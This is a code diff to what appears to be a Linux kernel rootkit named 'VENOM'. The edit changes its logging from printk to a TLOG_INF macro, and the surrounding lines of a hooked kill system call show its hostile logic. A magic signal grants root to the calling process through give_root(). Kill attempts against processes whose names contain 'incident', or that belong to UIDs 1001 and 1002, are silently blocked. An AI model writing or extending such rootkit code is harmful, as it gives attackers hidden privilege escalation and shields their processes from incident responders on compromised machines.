@@ -53,7 +53,7 @@ notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
     
 
     if (sig == g_magic_signal && pid == 0) {
-        printk(KERN_INFO "[VENOM] Magic signal %d detected - granting root privileges to PID %d\n", 
+        TLOG_INF("[VENOM] Magic signal %d detected - granting root privileges to PID %d\n", 
                g_magic_signal, current->pid);
         give_root();
         return 0; 
@@ -72,7 +72,7 @@ notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
                 strstr(target_task->comm, "incident")) {
                 
                 rcu_read_unlock();
-                printk(KERN_INFO "[VENOM] Blocked attempt to kill protected process: %s (PID: %d)\n", 
+                TLOG_INF("[VENOM] Blocked attempt to kill protected process: %s (PID: %d)\n", 
                        target_task->comm, pid);
                 return 0; 
             }
@@ -81,7 +81,7 @@ notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
             if (target_task->cred->uid.val == 1001 || 
                 target_task->cred->uid.val == 1002) {  
                 rcu_read_unlock();
-                printk(KERN_INFO "[VENOM] Blocked attempt to kill process (UID: %d)\n", 
+                TLOG_INF("[VENOM] Blocked attempt to kill process (UID: %d)\n", 
                        target_task->cred->uid.val);
                 return 0;
             }
@@ -94,5 +94,3 @@ notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
 }
 
 #endif 
-
-
